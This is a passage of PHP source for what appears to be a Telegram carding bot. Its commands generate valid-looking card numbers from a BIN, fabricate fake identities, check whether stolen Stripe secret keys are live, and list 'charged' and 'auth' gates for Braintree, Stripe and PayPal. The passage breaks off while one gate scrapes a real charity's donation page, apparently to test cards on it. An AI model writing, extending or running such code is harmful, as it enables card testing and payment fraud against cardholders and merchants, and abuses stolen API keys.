elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(strpos($message, ".chds") === 0)) {
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /en\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
        //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Auth ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}


elseif((strpos($message, "!pys") === 0)||(strpos($message, "/pys") === 0)||(strpos($message, ".pys") === 0)) {
        //$respuesta = "\n◤━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙿𝚊𝚢𝙿𝚊𝚕 ☆ ━━━━◥\n\n🔥 Paypal ✔\n➣ Checker ➟ !pp\n⁕ Usage: !pp ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates PayPal\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Paypal ✔\n➣ Command ➟ /pp\n⁕ Status: OFF!❌\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!me") === 0)||(strpos($message, "/me") === 0)||(strpos($message, ".me") === 0))
{
	$respuesta = "[ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ:".$id."\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
//$respuesta = "⁕ ─ 𝑈𝑆𝐸𝑅 𝐼𝑁𝐹𝑂 ─ ⁕\n➩ 𝚄𝚂𝙴𝚁 𝙸𝙳: <code>".$id."</code>\n➩ 𝙵𝚄𝙻𝙻 𝙽𝙰𝙼𝙴: ".$Name." ".$last."\n➩ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴: @".$user."\n➩ 𝚄𝚂𝙴𝚁 𝚃𝚈𝙿𝙴: ".$tipo."\n";
	$respuesta = "     [ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ: <code>".$id."</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
	sendMessage($chat_id,$respuesta,$message_id);
}
//--------------------------END INFO-------------------------//


elseif((strpos($message, "!gen") === 0)||(strpos($message, "/gen") === 0)||(strpos($message, ".gen") === 0)){
$si = substr($message, 5);

if($si != ''){
}else{
//$respuesta = "━━━━━━━•⟮ɢᴇɴ ᴄᴄs⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .gen xxxxxxx\n";
$respuesta = "🚫 Oops!\nUse this format: /gen xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$lista = substr($message, 5);
$target = substr($lista, 0,2);

$bin = explode("|", $lista)[0];
$mes1 = explode("|", $lista)[1];
$ano1 = explode("|", $lista)[2];
$cvv1 = explode("|", $lista)[3];
if (strlen($ano1) == 2) {
    $ano1 = '20' . $ano1;
}
$d4 = "".$bin."xxxxxxxxxxxxxxxxx";

if ($target == "37" || $target == "34"){
        $bin = substr($d4, 0, 14);
        $cant = "15";

}else{
        $bin = substr($d4, 0, 15);
        $cant = "16";
}
	
$Bin = substr($bin, 0, 6);
$amount = "10";

if (empty($mes1)){
$mes1="rnd";
}
if (empty($ano1)){
$ano1="rnd";
}
if (empty($cvv1)){
$cvv1="rnd";
}
sleep(1);


for ($i=$amount;$i>-0;$i--){

//-------GERADOR DE MES - AÑO - CCV -------//
        $randMonth = rand(1, 12);
        $randYears = rand(25, 30);
if ($target == "37" || $target == "34"){
        $randCvv = rand(1000, 9999);
}else{
        $randCvv = rand(100, 999);
}
        $randMonth < 10 ? $randMonth = "0" . $randMonth : $randMonth = $randMonth;
        $randCvv < 100 ? $randCvv = "0" . $randCvv : $randCvv = $randCvv;
        $fecha = "|".$randMonth."|20".$randYears."|".$randCvv;

//-----GENERADOR DE CC------//
if(is_numeric($mes1)){
$mes = $mes1;
}else{
$mes = $randMonth;
}
if(is_numeric($ano1)){
$ano = $ano1;
}else{
$ano = "20$randYears";
}
if(is_numeric($cvv1)){
$cvv = $cvv1;
}else{
$cvv = $randCvv;
}
$data = "|$mes|$ano|$cvv";
            $ccNumber = $bin;
            while (strlen($ccNumber) < ($cant - 1)) {
                $ccNumber .= rand(0, 9);
            }
            $ccNumber = str_split($ccNumber);
            $replace = "";
            foreach ($ccNumber as $cc => $key) {
            $replace .= str_replace("x", rand(0, 9), $key);
            }

$ccs = Calculate($replace, $cant);
$cards = $ccs.$data;
$data = "<code>".$cards."</code>";

$da = "".$data."\n";
        $archivo = fopen("cc-gen","a");
        fwrite($archivo,$da);
        fclose($archivo);
        }

        $ccs = file_get_contents("cc-gen");

$Bin_Gen = Bin_Gen_Info($Bin); //
$Bin = "<code>$Bin</code>";
$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n".$Bin_Gen."";


//$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $brand - $type - $level\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";
editMessage($chat_id,$respuesta,$id_text);
unlink("cc-gen");
die();
}





elseif((strpos($message, "!fake") === 0)||(strpos($message, "/fake") === 0)||(strpos($message, ".fake") === 0)){

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = ucfirst($matches1[1][0]);
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = ucfirst($matches1[1][0]);
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = ucfirst($matches1[1][0]);
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = ucfirst($matches1[1][0]);
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = ucfirst($matches1[1][0]);
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
//---------------------------////---------------------------//
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $matches);
$GmailUser = $matches[1];
//---------------------------//
// Extraer el valor del dominio
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
$dominio = trim($matches[1]);
// Eliminar espacios en blanco
//---------------------------//
$usr = str_replace("@", "", $dominio);
//---------------------------//
$email = "$GmailUser$dominio";
$link = "https://www.fakemailgenerator.com/#/$usr/$GmailUser/";

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);
$respuesta = "━━━━━━•⟮ғᴀᴋᴇ ᴜsᴇʀ⟯•━━━━━━\n➭ 𝙽𝙰𝙼𝙴: <code>".$name."</code>\n➭ 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴: <code>".$last."</code>\n➭ 𝙴𝙼𝙰𝙸𝙻: <code>".$email."</code> <a href='".$link."'>(ᴏᴘᴇɴ ʟɪɴᴋ)</a>\n➭ 𝚂𝚃𝚁𝙴𝙴𝚃: <code>".$street."</code>\n➭ 𝙲𝙸𝚃𝚈: <code>".$city."</code>\n➭ 𝚂𝚃𝙰𝚃𝙴: <code>".$state."</code>\n➭ 𝙿𝙷𝙾𝙽𝙴: <code>".$phone."</code>\n➭ 𝙿𝙾𝚂𝚃 𝙲𝙾𝙳𝙴: <code>".$postcode."</code>\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝚄𝚂𝙴𝚁: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: $admin\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);

}


elseif((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)||(strpos($message, ".sk") === 0)){
$si = substr($message, 4);
$key = substr($message, 4);

if(preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $key, $matches)) {
$sk = $matches[0][0];
}


if ($si != '' && $sk != '' ){
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ks sk_live_xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


// Bonus: SK Key Checker
$skhiden = substr_replace($sk, '',12).preg_replace("/(?!^).(?!$)/", "*", substr($sk, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

$message = trim(strip_tags(getStr($result,'"message":"','.')));
if (empty($message)) {
$message = 'Charge Found';
}

if (strpos($result, 'api_key_expired')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK EXPIRED ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Expired API key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif (strpos($result, 'Invalid API Key provided')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK INVALID ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Invalid API Key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: You did not provide an API key.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Your account cannot currently make live charges.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK LIVE ✅\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ".$message.".\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
}



elseif((strpos($message, "!iban") === 0)||(strpos($message, "/iban") === 0)||(strpos($message, ".iban") === 0)){
$si = substr($message, 6);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ɪʙᴀɴ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .iban xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//$message = "/iban 4520880028518536|03|2023|854";
$ibanx = substr($message, 6);
$iban = substr($ibanx, 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO
$curl = curl_init('https://openiban.com/validate/'.$iban.'?validateBankCode=true&getBIC=true');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);

$bankcode1 = capture($content, '"bankCode": "', '"');
$bankname = capture($content, '"name": "', '"');
$zip = capture($content, '"zip": "', '"');
$city = capture($content, '"city": "', '"');
$bic = capture($content, '"bic": "', '"');
$timetakeen = (microtime(true) - $startTime);
$timetaken = substr_replace($timetakeen, '',4);

if(strpos($content, 'valid": true')){
$respuesta = "IBAN -LIVE ✅ $iban\nBIC: $bic\nBank Code: $bankcode1\nBank: $bankname\nCity: $city\nTime: $timetaken's\n━━━━━━━━━━━━━";
editMessage($chat_id,$respuesta,$id_text);
}
elseif(strpos($content, 'valid": false')){
$respuesta = "IBAN - DEAD ❌ $iban\nTime: $timetaken's";
editMessage($chat_id,$respuesta,$id_text);
}

}



elseif((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)||(strpos($message, ".bin") === 0)){
$tr = explode(" ", $message);
$comando = ltrim($tr[0], "/.!"); // elimina /, . o ! del inicio del comando
if (count($tr) > 1) {
    $numero = $tr[1];
    $primeros6 = substr($numero, 0, 6);
    if (strlen($primeros6) == 6 && ctype_digit($primeros6)) {
     $bin = $primeros6;
    // echo "bin: $primeros6";
    } else {
	    $respuesta = "🚫 Oops!\nUse this format: /bin xxxxxx\n";
//$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .bin xxxxxx\n";
	    sendMessage($chat_id,$respuesta,$message_id);
	    die();
    }
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//$bin = substr($message, 5);
//$bin = substr("$bin", 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO


//Extrae la información del bin///
$bin_info = Bininfo($bin);
//$respuesta = "".$bin_info."━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";
$respuesta = "".$bin_info."—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦ 么◦✧——————\n";
//$respuesta = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$name."\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: 💲".$currency."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
//----------------------END CHECK BIN-----------------------//




elseif((strpos($message, "!extb") === 0)||(strpos($message, "/extb") === 0)||(strpos($message, ".extb") === 0)){
/////SOLO SE USA UN BIN ///

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ʙᴀsɪᴄ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extb xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extb xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$lista = substr($message, 6);
$i1     = explode("|", $lista);
$basic    = $i1[0];
$basica = substr("$basic", 0, 10);
$extb = "".$basica."xxxxxx";
$extb = "<code>".$extb."</code>";

$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐵𝐴𝑆𝐼𝐶𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extb."\n";
editMessage($chat_id,$respuesta,$id_text);
}






elseif((strpos($message, "!exti") === 0)||(strpos($message, "/exti") === 0)||(strpos($message, ".exti") === 0)){
///SE USA SOLO 1 BIN//

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ɪɴᴅᴇɴᴛ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exti xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//MaTerialDInVerter
$lista = substr($message, 6);
$i1     = explode("|", $lista);
$cc1    = $i1[0];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 6, 10);
$uno = substr("$cc", 0, 3);
$dos = substr("$cc", 3, 4);
$tres = substr("$cc", 7, 3);
//-----------------------------//
$to1 = substr("$uno", 1, 1);
$to2 = substr("$dos", 1, 2);
$to3 = substr("$tres", 1, 1);
//-----------------------------//
$fin1 = str_replace($to1, 'x', $uno);
$fin2 = str_replace($to2, 'xx', $dos);
$fin3 = str_replace($to3, 'x', $tres);


$extra = "$bin$fin1$fin2$fin3";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐼𝑁𝐷𝐸𝑁𝑇𝐴𝐶𝐼𝑂𝑁 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}





elseif((strpos($message, "!en") === 0)||(strpos($message, "/en") === 0)||(strpos($message, ".en") === 0)){
//$lista = preg_replace('/\s+/', '', $lista);
$lista = substr($message, 4);

$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /en CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
                                    }


////EXTRAE EL NONCE////
$cc = implode('+', $partes);

//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://environmentvictoria.org.au/give/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'ap3c=IGd4hf2AuelnYH4BAGd4hf2gztotpay7CT3X-oYpVWlMiMuNVA; PHPSESSID=ec26389e2fe6166a22d67286f65cb59f; __cf_bm=1Ye2xpjCVJIqlTxQILHysFAjb_8bw1zRDHV4yZ7AD9E-1735953044-1.0.1.1-Sn8gl_rNV5oBBoVDY380qKL.KWA_5WPy5YEPod4vVShR4H6qxU_SYmzOul15308sekfYVsIafj_MISD6_bCXag; ap3pages=19',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://environmentvictoria.org.au/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);



$curl = curl_init();

curl_setopt_array($curl, [
